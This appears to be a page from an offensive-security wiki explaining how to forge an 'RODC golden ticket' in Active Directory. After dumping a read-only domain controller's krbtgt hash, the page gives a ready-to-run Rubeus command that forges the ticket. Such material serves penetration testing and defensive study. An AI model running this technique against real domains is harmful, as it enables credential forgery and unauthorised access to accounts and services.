## Thoery
With administrative access to an RODC, it is possible to dump all the cached credentials, including those of the `krbtgt_XXXXX` account. The hash can be used to forge a "RODC golden ticket" for any account in the `msDS-RevealOnDemandGroup` and not in the `msDS-NeverRevealGroup` attributes of the RODC. This ticket can be presented to the RODC or any accessible standard writable Domain Controller to request a Service Ticket (ST).
!!! note
    When presenting a RODC golden ticket to a writable (i.e. standard) Domain Controller, it is not worth crafting the PAC because it will be recalculated by the writable Domain Controller when issuing a service ticket (ST).
## Exploit
=== "Windows"
    From Windows systems, Rubeus (C#) can be used for this purpose.
    ```bash
    Rubeus.exe golden /rodcNumber:$KBRTGT_NUMBER /flags:forwardable,renewable,enc_pa_rep /nowrap /outfile:ticket.kirbi /aes256:$KRBTGT_AES_KEY /user:USER /id:USER_RID /domain:domain.local /sid:DOMAIN_SID
    ```